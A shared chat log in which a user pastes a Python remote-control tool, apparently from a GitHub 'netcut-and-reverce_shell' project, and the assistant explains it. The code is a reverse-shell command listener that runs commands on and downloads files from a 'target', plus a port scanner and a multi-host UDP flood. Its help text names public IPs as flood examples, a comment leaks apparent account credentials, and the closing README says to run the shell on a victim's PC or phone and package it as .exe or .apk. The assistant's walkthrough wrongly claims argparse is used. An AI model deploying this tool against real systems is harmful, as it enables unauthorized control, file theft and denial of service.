
Netcat-like Tool Explanation

Default (GPT-3.5)

User
#!/usr/bin/python
#-*-coding:utf8;-*-
#qpy:console
from urllib.request import urlretrieve
import socketserver
import http.server
import subprocess
import threading
import argparse
import random
import socket
import tqdm
import time
import sys
import os

#git account p = DEVILO.K@evil123 ,u = omer-devil: password of 000webhost = (#yT8w5JFz^*K6ELf)AVK)

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def clear():
    os.system("clear")


help = YELLOW + """\n\t\t-------------- Help ------------------\n
    Commands\t\tUse\t\t\t\tExample"""+END+GREEN+"""
    l-host\t\tlocal-host <command>\t\tl-host ls
    download\t\tdownload <file name>\t\tdownload music.mp4
    server\t\tserver <IP:PORT>   \t\tserver 127.0.0.1:468
    target-ip\t\ttarget-ip             \t\tit shows the target ip
    output_save\t\toutput_save <True|False>\toutput_seve True or output_save False

    help\t\tit shows this help message

    if you on windows you can reset the password by typing as follows
    net user <user name> <new password> example: net user omer password123

    For more information type the name of the command follow by -h or --help
    """ + END
def HELP():
    print("""
------------------------------------------help---------------------------------------------
[+] netcat-v1.5.py [Options]
[+] netcat-v1.5.py [[-h,--help,help] , [-d,--download] , [-s,--port-scan] , [-l,--listen] , [--udp-flood]]
[+] Options:
        -h,--help,help   : it print this help message
        -d.--download    : it used to download files from the given url
        -s,--port-scan   : it used to scan the given host for an open Port
        -l,--listen      : it used to liston for target to connect
        --udp-flood      : it used to attack the given host and other by providing the IP
""")

def run_server(dir_name):
    try:
        os.chdir(dir_name)
        IP   = socket.gethostname()
        PORT = 8080
        #creating request handler with variable name handler
        handler = http.server.SimpleHTTPRequestHandler
        #binding the request with the ip and port as httpd
        with socketserver.TCPServer((IP, int(PORT)), handler) as httpd:
            messeage = YELLOW+"[+] Server started at  -> "+IP+":"+str(PORT)+END
            print(messeage)
            #running the server
            httpd.serve_forever()
    except Exception as e:
        print(e)

def download(url):
    try:
        _save_as = input("[+] Enter file name to save it as: ")
        if _save_as == "" or _save_as == " "*len(_save_as):
            print("[!] Please provid a file name!!")
        else:
            #os.system("clear")
            urlretrieve(url,_save_as)
    except Exception as e:
        print(e)

def port_scan(_host):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    for port in range(1,100):
        try:
            s.connect((host,port))
            print(f"[+] Found open port at {_host}:{port}")
        except:
            print(f"[-] port is close {port}")

def udp_flood(_ss,_bytes,_host):
    while not(ch_point):
        try:
            for _port in range(1,100):
             _ss.sendto(_bytes,(_host,_port))
        except:
            break
    print("[+] Thread stoped!...")

def emo():
    emots = ["☆","♤",
             "♡","◇",
             "♧","¤",
             "@","■"
            ]
    emot  = random.choice(emots)
    return emot

def Help(com):

    if com == "l-host":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("l-host      \t\tl-host <command> : Executing command on localhost or current hosting machine")
        print("""
l-host <commands>     : used to execute command on the local-host
                        example : l-host pwd
                                  l-host ls""")

    elif com == "download":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("download\t\tsend <file name> : download file to the host")
        print(""""
download <file_name>  : used to download file,mid,app and other from the target
                         example : download video.mp4
                                   download music.mp3
                                   download dir_name2/dir_name2/music.mp3""")

    elif com == "server":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("server      \t\tserver <IP:PORT> ")
        print("""
server <host:port>    : used to run http server on the target to access target file throughout browser
                     example  : server 127.0.0.1:55555
                     note that: it only recommend on the same network""")

    elif com[:9] == "target-ip":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("target-ip\t\ttarget_ip")
        print("""
target-ip <optional_command>: used to return the target ip
                    example : target-ip
                              target-ip help : help is the only optional command available""")
    elif com == "output_save":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("output_save\t\toutput_save <True|False>")
        print("""
output_save <True|False>    : used to save the received output command to default file name or
                              you can just changed the file name
                    example : output_seve True  : start saving
                              output_seve False : stop saving""")
    else:
        print(help)

def LocalHost(com):
    print(YELLOW+"\n\n\n"+"-"*50+END)
    print(GREEN+"[.......BEGINNING EXECUTING COMMAND ON LOCALHOST.......]"+END)
    print(YELLOW, "-"*50,END, "\n")

    if com[:2] == "cd":
        try:
            os.chdir(com[3:])
        except Exception as e:
            print(e)

    elif com[:2] == "ls":
        com = ("ls --color" + com[3:])
        os.system(com)

    else:
        os.system(com)
    print(YELLOW+"\n"+"-"*50+END)
    print(GREEN+"[...................END OF EXECUTING...................]"+END)
    print(YELLOW,"-"*50,END, "\n\n\n")

def recive(c,_port):

    print(_port)

    mp = 131537871
    _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print(MAGENTA+"[+] START_DAWNLOADING..."+END)

    try:
        _s.bind((host,_port))
        _s.listen(5)
        (_conn,_addr) = _s.accept()
    except:
        pass
    file_size = int(_conn.recv(1024).decode("utf-8"))
    _size = (125.44*file_size)/mp
    print("file name: ",c,"file size: ",_size,"MB")
    with open(c,"wb") as file:
        #The time when the data start recving
        start_time = time.time()
        progress = tqdm.tqdm(unit="B", unit_scale=True, unit_divisor=1024,total=file_size)
        while True:
            data = _conn.recv(1024)
            if not(data):
                progress.update(1024)
                #time.sleep(1)
                break
            progress.update(1024)
            file.write(data)

            #The time when the data stop recving
        progress.update(1024)
        end_time = time.time()
        print("\nFile dwonload successfully in ",float(end_time - start_time),"seconds")
        _conn.close()
        _s.close()

def main(port,_port):

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    seve_to_file = False
    default_fname = "save_out_put.txt"

    try:
        s.bind((host,port))

        print(GREEN+"[WAITING FOR THE CONNECTION...]"+END)
        s.listen(5)

        (conn,addr) = s.accept()
        pwd = conn.recv(1024).decode("utf-8")
        clear()
    #print(YELLOW+"\t\t\t[TARGET ADDRS = "+END+GREEN+addr[0]+"]"+END)

    except Exception as e:
        print(RED,"[!][!] ",e,END)
        exit()

    except KeyboardInterrupt:
        clear()
        print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite...")
        try:
            input("[Peres_Enter_To_Exit...]"+END)
            clear()
            s.close()
            exit(0)
        except KeyboardInterrupt:
              print(YELLOW+"[-] stupid can't escape this reality"+END)
              s.close()
              exit()
              pass

    while True:


        try:
            emot = emo()
            com = input(BLUE+"<●"+END+GREEN+"["+END+YELLOW+"Net-Cat"+END+GREEN+"]"+END+BLUE+emot+END+GREEN+"["+END+MAGENTA+pwd+END+GREEN+"]"+END+BLUE+"> "+END+GREEN+"\n\t   └─$ ")
            """help me"""+END
            if com[:8]=="download":

                if len(com) == 8:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)
                elif com[9:] == "-h" or com[9:] == "--help":
                    Help(com[:8])
                else:
                    conn.send(str.encode(com))
                    c = com[9:]
                    recive(c,_port)

            elif com[:6] == "l-host":

                if len(com) == 6:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)

                elif com[7:] == "-h" or com[7:] == "--help":
                    Help(com[:6])
                else:
                    com = com[7:]
                    LocalHost(com)
            elif com[:9] == "target-ip":
                if len(com) == 9:
                    print(GREEN,"[+] [TARGET]",END,YELLOW, " target ip = {}".format(addr[0]),END )
                else:
                    if com[10:] == "help" or com[10:] == "-h" or com[10:] == "--help":
                        Help(com[:9])
                    else:
                        print(RED+"[!] Invalid commands!!\n"+END,GREEN+"[Try] : target-ip help, -h or --help"+END)
            elif com[:11] == "output_save":
                if len(com) == 11:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)
                elif com[12:] == "-h" or com[12:] == "--help":
                    Help(com[:11])
                elif com[12:] == "True" or com[12:] == "true":
                    seve_to_file = True
                    new_fname = input("[+] Enter file name"+YELLOW+"(Default : {}): ".format(default_fname)+END)
                    if len(new_fname) != 0:
                        if new_fname == (" " * len(new_fname)):
                            print(YELLOW, "[+] Please Enter Valid Name ",END)
                            seve_to_file = False
                        else:
                            default_fname = new_fname
                elif com[12:] == "False" or com[12:] == "false":
                    seve_to_file = False
            elif com == "help":
                Help(com)

            elif com[:6] == "server":
                if len(com) == 6:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)
                elif com[7:] == "-h" or com[7:] == "--help":
                    Help(com[:6])
                else:
                    if ":" in com:
                        conn.send(str.encode(com))
                    else:
                        print(RED+"Invalid addres!!"+END)

            else:

                if com == "" or com == (" " * len(com)):
                    com = "echo '[!][!] cannot execute empty commands :p'"

                conn.send(str.encode(com))

                if com == "exit" or com == "quite":
                    try:
                        input(RED+"[Peres_Enter_To_Exit...]"+END)
                        print(MAGENTA+"[EXITING... Good Bay...]"+END)
                        conn.send(str.encode(com))
                        break
                    except KeyboardInterrupt:
                        print(YELLOW+"[-] stupid can't escape this reality"+END)
                        break
                # maximum recive data 99999999B = 953.6743154526MB
                m = str(conn.recv(999999999),"utf-8")
                if "-pwd@-" in m:
                    pwd = m[6:]
                    m = GREEN+"[+]  successfully moved to : " + m[6:] +END
                print(m)
                if seve_to_file:
                    with open("input.txt","w") as f0:
                        f0.write(m)
                    with open("input.txt","r") as f,\
                            open(default_fname,"a") as f2:
                                f2.write("<● [Netcat]-[{}]>{}\n".format(pwd,com))
                                for word in f.readlines():
                                     if "." in word:
                                        if "[" in word:
                                            f2.write("\t\t"+word[7:-4]+"[directory]\n")
                                        else:
                                            f2.write("\t\t"+word)
                                     else:
                                        if "[" in word:
                                            f2.write("\t\t/"+word[7:-4]+"[directory]\n")
                                        else:
                                            f2.write("\t\t/"+word)
                    os.system("rm -r input.txt")

        except Exception as e:
            print(e)

        except KeyboardInterrupt:
            clear()
            print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite..."+END)
            try:
                input(MAGENTA+"[Peres_Enter_To_Continuse...]"+END)
                clear()
                pass
            except  KeyboardInterrupt:
                print(YELLOW+"[-] stupid can't escape this reality"+END)
                pass

    conn.close()
    s.close()

if __name__ == "__main__":
    global ch_point
    global host
    global port

    ch_point = False
    host = ""
    port = 55555
    try:

        if sys.argv[1] == "-h" or sys.argv[1] == "--help" or sys.argv[1] == "help":
            HELP()

        elif sys.argv[1] == "--download" or sys.argv[1] == "-d":
            try:
                if sys.argv[2] == " "*len(sys.argv[2]):
                    print("[!] Please Enter Valid url.\n[+] Try -d https://www.example-web.com/sample.pdf or\n--download https://www.example-web.com/sample.pdf")
                else:
                    download(sys.argv[2])
            except:
                print("[+] Try -d https://www.example-web.com/sample.pdf or\n--download https://www.example-web.com/sample.pdf")

        elif sys.argv[1] == "--port-scan" or sys.argv[1] == "-s":
            try:
                port_scan(sys.argv[2])
            except:
                print(sys.argv[2])
                print("[+] Try: -s 127.0.0.1 or --port-scan 127.0.0.1 [-s,--port-scan <host>]")

        elif sys.argv[1] == "--udp-flood":
            try:
                host = sys.argv[2]
                Exit = ["e","q","quite","exit"]
                _list = host.split(",")
                host_l = len(_list)
                _bytes = random._urandom(1024)
                _ss = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                if host_l == 1:
                    _host = _list[0]
                    try:
                        _ss.sendto(_bytes,(_host,80))
                        t = threading.Thread(target = udp_flood(_ss,_bytes,_host))
                        t.start()
                        while True:
                            _com = input("[+] > ")
                            if _com in Exit:
                                ch_point = True
                                break
                    except:
                        print("[+] Invalid addres...",_host)
                else:
                   _host = _list[0]
                   try:
                       _ss.sendto(_bytes,(_host,80))
                       for _host in _list:
                           t = threading.Thread(target = udp_flood,args = (_ss,_bytes,_host))
                           t.start()
                   except:
                       print("[+] Invalid addres...")
                print("[+] type q,quite,e or exit to stop the attack!!")
                while True:
                    _com = input("[+] > ")
                    if _com in Exit:
                        ch_point = True
                        break

            except Exception as e:
                print("[+] try: --udp-flood 142.250.181.164 or --udp-flood www.google.com [--udp-flood <host>]\n--udp-flood 127.0.0.1,142.250.181.164,8.8.8.8 no space bettwen the host and the coma(,)",e)

        elif sys.argv[1] == "--listen" or sys.argv[1] == "-l":
            print("iam in")
            try:
                port  = int(sys.argv[2])
                _port = port - 1
                print("[+] listening on port number {}".format(port))
                main(port,_port)
            except:
                _port = port - 1
                main(port,_port)
        elif sys.argv[1] == "-ss" or sys.argv[1] == "--server":
            try:
                run_server(sys.argv[2])
            except:
                print("[+] Try: -ss dir_name1/dir_name2 or --server dir_name1/dir_name2 [-ss,--server <path of the folder>")

    except:
        HELP()

ChatGPT
It looks like you've provided a Python script that seems to be a version of a netcat-like tool. Netcat is a versatile networking utility used for reading from and writing to network connections. This script appears to provide a command-line interface to perform various actions such as running a local server, downloading files, executing commands on a target host, and more.

Is there something specific you'd like to know or do with this script? Please provide more information or let me know how I can assist you further.




User
Explain every possible part of the code

ChatGPT
Sure, let's break down the different parts of the code:

Imports:

python
Copy code
from urllib.request import urlretrieve
import socketserver
import http.server
import subprocess
import threading
import argparse
import random
import socket
import tqdm
import time
import sys
import os
These are import statements that bring in various modules and libraries used throughout the script. Some of these modules are used for handling networking, file I/O, threading, and more.

Color Codes:

python
Copy code
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
These variables define color codes for console output. They are used to give different colors to the text displayed in the terminal for better readability.

Function Definitions:

python
Copy code
def clear():
def HELP():
def run_server(dir_name):
def download(url):
def port_scan(_host):
def udp_flood(_ss, _bytes, _host):
def emo():
def Help(com):
def LocalHost(com):
def recive(c, _port):
def main(port, _port):
These are various functions defined within the script. Each function serves a specific purpose, like running a server, downloading files, executing commands, and more. They are called later in the script as needed.

Help Messages:

python
Copy code
help = YELLOW + """\n\t\t-------------- Help ------------------\n
...
"""
This is a lengthy help message that explains how to use various commands and options available in the script. It provides users with instructions on how to interact with the script.

Global Variables:

python
Copy code
global ch_point
global host
global port
These variables are marked as global, which means they can be accessed and modified from different parts of the script. They are used to keep track of information like the target host, port, and a flag for stopping threads.

Command-Line Arguments Parsing:

python
Copy code
if __name__ == "__main__":
    ...
This block of code is executed when the script is run directly (not imported as a module). It handles the command-line arguments using the argparse library. Depending on the arguments provided, the script takes different actions, such as running a server, downloading files, listening for connections, and more.

Execution of Main Functions:
The script includes functions to perform actions like running a local server, downloading files, executing commands, and more. These functions are called based on the arguments provided through the command line.

User Interface (UI):
The script uses color-coded UI elements to display prompts, information, and outputs to the user. This enhances the readability and interaction with the tool.

Error Handling:
Throughout the script, there are try-except blocks used to catch exceptions that might occur during execution. These blocks help handle unexpected situations gracefully and provide feedback to the user.

Remember that this script is quite extensive and seems to offer a variety of networking and file manipulation functionalities. If you have any specific questions about certain parts of the script or how they work, feel free to ask!




User
And explain all functions in deep

ChatGPT
Certainly! Let's go through each of the functions in detail and explain their purpose and how they work:

clear():
This function is responsible for clearing the terminal screen. It uses the os.system("clear") command to clear the terminal screen by sending a clear screen command to the operating system's shell.

HELP():
This function prints out the help message that provides information about various commands and options available in the script. The help message explains how to use the different functionalities provided by the script.

run_server(dir_name):
This function takes a directory name as an argument and is used to run a simple HTTP server to serve files from the specified directory. It changes the working directory to the provided directory, creates an HTTP server, and serves files from that directory on a specified IP and port. The http.server.SimpleHTTPRequestHandler is used to handle incoming HTTP requests.

download(url):
This function is responsible for downloading files from a given URL. It prompts the user for a filename to save the downloaded content as. The urlretrieve() function from the urllib.request module is used to perform the actual download.

port_scan(_host):
This function performs a basic port scanning on a target host. It tries to connect to a range of ports on the specified host. If a connection can be established, it indicates that the port is open; otherwise, it indicates that the port is closed.

udp_flood(_ss, _bytes, _host):
This function simulates a UDP flood attack on a target host. It sends a large number of UDP packets to the target host to overwhelm its network resources. It uses a provided socket _ss to send packets to the specified host using the provided bytes _bytes.

emo():
This function returns a randomly chosen emoji character from a predefined list of emojis. It is used to add a touch of random decoration to the script's user interface.

Help(com):
This function provides detailed help information for different commands based on the argument com. It explains how to use specific commands, their arguments, and options.

LocalHost(com):
This function handles executing commands on the local host where the script is running. It can change the current working directory using cd, list directory contents using ls, and execute arbitrary shell commands.

recive(c, _port):
This function is used to receive files sent from a remote host. It sets up a socket to listen for incoming connections, reads the file size, and then receives the file data in chunks. It provides progress updates using the tqdm library while receiving the data.

main(port, _port):
This is the main function that handles the interaction with a remote host. It establishes a connection with the host, sends commands, receives output, and handles options such as saving the output to a file. It also handles the logic for stopping the script or breaking out of loops.

These functions work together to provide a versatile networking and file manipulation tool. They cover various tasks, from interacting with a remote host to downloading files, running a local server, and more

## netcut-and-reverce_shell
Controlling othe pc or phone with python
__________________________________
[#] install:<br>
       ~$git clone https://github.com/omer-devil/netcut-and-reverce_shell.git <br>
       and move to the project directory:<br>
             ~$cd netcut-and-reverce_shellh<br>
       now install the requirements.<br>
             ~$pip3 install -r requirements.txt<br>
       
___________________________________
[#] how to use:<br>
       first run Net-Cat on your computer:<br>
               ~$python3 netcat.py<br>
       then run reverce_shell on the target pc<br>
               ~$python3 reverce_shell.py<br>
       and then you get access to the target pc or phone<br>
       note:-you can conver reverce_shell.py into .exe file or .apk file<br>
            to conver it to .exe use pyinstaller and<br>
            for .apk use buildozer<br>
______________________________________
[#] all the command availabl in netcut-and-reverce_shellh, with use and example:<br>
    Commands.                 Use.                                  Example<br>
    l-host.                   local-host <command>                  local-host ls<br>
    download.                 download <file name>                  download music.mp4<br>
    server.                   server <IP:PORT>                      server 127.0.0.1:468<br>
    target-ip.                target-ip                             it shows the target ip<br>
    output_save.              output_save <True/False>              output_seve True or output_save False<br>
    <br>
    help.                     shows this help message<br>
